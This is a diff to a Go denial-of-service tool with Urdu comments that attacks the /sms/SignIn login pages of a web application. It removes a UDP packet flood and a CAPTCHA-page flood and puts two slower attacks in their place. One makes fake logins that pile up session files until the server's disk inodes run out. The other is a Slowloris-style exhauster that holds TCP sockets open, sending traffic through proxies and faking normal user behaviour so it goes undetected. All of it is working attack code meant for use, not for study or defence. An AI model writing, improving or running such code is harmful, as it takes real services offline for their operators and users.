@@ -82,12 +82,21 @@ func slowLoginBody() io.Reader {
 }
 
 // ============================================================
-// LAYER 2: CAPTCHA PAGE FLOOD (CPU + DB EXHAUSTION)
+// LAYER 2: SLOW SESSION & DISK EXHAUSTION
+// یہ ایک عام صارف کی نقل کرتا ہے:
+// 1. آہستہ آہستہ SignIn صفحہ کھولتا ہے۔
+// 2. ایک طویل تاخیر کرتا ہے۔
+// 3. غلط لاگ ان کی کوشش کرتا ہے۔
+// 4. ہر ریکویسٹ کے ساتھ نیا PHPSESSID بنتا ہے اور سیشن فائل ڈسک پر لکھی جاتی ہے۔
+// مقصد: 24-48 گھنٹوں میں لاکھوں بیکار سیشن فائلیں بنا کر ڈسک inodes ختم کرنا۔
 // ============================================================
 func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
-	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
+	client := o.proxyMgr.NewClient()
+	client.Timeout = 30 * time.Second // طویل ٹائم آؤٹ، تاکہ سست سرور پر بھی کام کرے
+
 	baseURL := strings.TrimRight(o.target.String(), "/")
-	targetURL := baseURL + "/sms/SignIn"
+	signInURL := baseURL + "/sms/SignIn"
+	loginURL := baseURL + "/sms/signmein"
 	layerIdx := 1
 
 	for {
@@ -97,28 +106,17 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		fullURL := fmt.Sprintf("%s?_=%d&r=%d", targetURL, time.Now().UnixNano(), rand.Int63())
-
-		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
-		if err != nil {
-			o.stats.FailedRequests.Add(1)
-			o.stats.Layers[layerIdx].Fail.Add(1)
-			continue
-		}
-
+		// 1. SignIn صفحہ حاصل کریں (سیشن شروع کریں)
+		req, _ := http.NewRequestWithContext(ctx, "GET", signInURL, nil)
 		req.Header.Set("User-Agent", randomUA())
 		req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
-		req.Header.Set("Connection", "keep-alive")
-		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-		req.Header.Set("Pragma", "no-cache")
-
 		resp, err := client.Do(req)
 		o.stats.TotalRequests.Add(1)
 		o.stats.Layers[layerIdx].Requests.Add(1)
-
 		if err != nil {
 			o.stats.FailedRequests.Add(1)
 			o.stats.Layers[layerIdx].Fail.Add(1)
+			time.Sleep(5 * time.Second)
 			continue
 		}
 		io.Copy(io.Discard, resp.Body)
@@ -126,12 +124,49 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
 
-		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
+		// 2. 10-30 سیکنڈ انتظار کریں (کسی عام صارف کی طرح)
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-time.After(time.Duration(rand.Intn(20)+10) * time.Second):
+		}
+
+		// 3. غلط لاگ ان کی کوشش کریں (سیشن فائل بنے گی)
+		body := fmt.Sprintf("username=%s&password=%s&capt=%d",
+			randomString(8+rand.Intn(8)),
+			randomString(8+rand.Intn(8)),
+			rand.Intn(20)+1)
+
+		req2, _ := http.NewRequestWithContext(ctx, "POST", loginURL, strings.NewReader(body))
+		req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req2.Header.Set("User-Agent", randomUA())
+		req2.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
+		req2.Header.Set("Referer", signInURL)
+
+		resp2, err2 := client.Do(req2)
+		o.stats.TotalRequests.Add(1)
+		o.stats.Layers[layerIdx].Requests.Add(1)
+		if err2 != nil {
+			o.stats.FailedRequests.Add(1)
+			o.stats.Layers[layerIdx].Fail.Add(1)
+		} else {
+			io.Copy(io.Discard, resp2.Body)
+			resp2.Body.Close()
+			o.stats.SuccessRequests.Add(1)
+			o.stats.Layers[layerIdx].Success.Add(1)
+		}
+
+		// 4. 30-120 سیکنڈ انتظار کریں (اگلے 'صارف' سے پہلے)
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-time.After(time.Duration(rand.Intn(90)+30) * time.Second):
+		}
 	}
 }
 
 // ============================================================
-// LAYER 3: CACHE BYPASS + FAKE LOGIN POST
+// LAYER 3: FAKE LOGIN POST (STANDARD VOLUME)
 // ============================================================
 func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
 	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
@@ -186,52 +221,60 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 }
 
 // ============================================================
-// LAYER 4: UDP NETWORK FLOOD (NETWORK PIPE SATURATION)
-// یہ حملہ HTTP کو مکمل نظرانداز کرتا ہے اور براہ راست سرور کے
-// نیٹ ورک اسٹیک کو نشانہ بناتا ہے، UDP پیکٹس کا سیلاب بھیج کر۔
+// LAYER 4: SLOW TCP SOCKET EXHAUSTER (طویل المدتی)
+// یہ بہت آہستہ آہستہ TCP کنکشن کھولتا ہے اور انہیں بہت دیر تک کھلا رکھتا ہے۔
+// مقصد: 12-24 گھنٹوں میں ہزاروں TCP ساکٹس کو ESTABLISHED حالت میں کھلا رکھ کر
+// کرنل کی ساکٹ ٹیبل آہستہ آہستہ بھرنا۔
 // ============================================================
-func udpNetworkFlood(ctx context.Context, o *Orchestrator, workerID int) error {
+func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
-
-	// ہوسٹ سے پورٹ الگ کریں، اگر پورٹ نہیں ہے تو ڈیفالٹ 80 استعمال کریں
-	host := o.target.Host
-	port := "80"
-	if h, p, err := net.SplitHostPort(host); err == nil {
-		host = h
-		port = p
-	}
-	targetAddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(host, port))
-	if err != nil {
-		return fmt.Errorf("UDP پتہ حل کرنے میں ناکامی: %w", err)
-	}
-
-	conn, err := net.DialUDP("udp", nil, targetAddr)
-	if err != nil {
-		return fmt.Errorf("UDP کنکشن بنانے میں ناکامی: %w", err)
-	}
-	defer conn.Close()
-
-	// 65,507 بائٹس کا ایک بہت بڑا UDP پیکٹ (میکسیمم UDP سائز)
-	payload := make([]byte, 65000)
-	rand.Read(payload)
 
 	for {
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
 		default:
-			conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
-			_, err := conn.Write(payload)
-			if err != nil {
-				o.stats.FailedRequests.Add(1)
-				o.stats.Layers[layerIdx].Fail.Add(1)
-				continue
+		}
+
+		conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
+		if err != nil {
+			time.Sleep(10 * time.Second)
+			continue
+		}
+
+		o.stats.TotalRequests.Add(1)
+		o.stats.Layers[layerIdx].Requests.Add(1)
+
+		// ایک جائز لیکن نامکمل HTTP درخواست بھیجیں
+		reqStr := fmt.Sprintf(
+			"GET /sms/SignIn HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n",
+			o.target.Host, randomUA(),
+		)
+		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+		conn.Write([]byte(reqStr))
+
+		// کنکشن کو 60-120 سیکنڈ تک کھلا رکھیں، اور ہر 15 سیکنڈ بعد ایک فضول ہیڈر بھیج دیں۔
+		duration := time.Duration(rand.Intn(60)+60) * time.Second
+		deadline := time.Now().Add(duration)
+		for time.Now().Before(deadline) {
+			select {
+			case <-ctx.Done():
+				conn.Close()
+				return ctx.Err()
+			case <-time.After(15 * time.Second):
+				conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
+				conn.Write([]byte("X-Keep-Alive: " + randomString(32) + "\r\n"))
 			}
-			o.stats.TotalRequests.Add(1)
-			o.stats.Layers[layerIdx].Requests.Add(1)
-			o.stats.SuccessRequests.Add(1)
-			o.stats.Layers[layerIdx].Success.Add(1)
-			o.stats.BytesSent.Add(int64(len(payload)))
+		}
+		conn.Close()
+		o.stats.SuccessRequests.Add(1)
+		o.stats.Layers[layerIdx].Success.Add(1)
+
+		// اگلا کنکشن کھولنے سے پہلے 30-60 سیکنڈ کا طویل وقفہ
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		case <-time.After(time.Duration(rand.Intn(30)+30) * time.Second):
 		}
 	}
 }
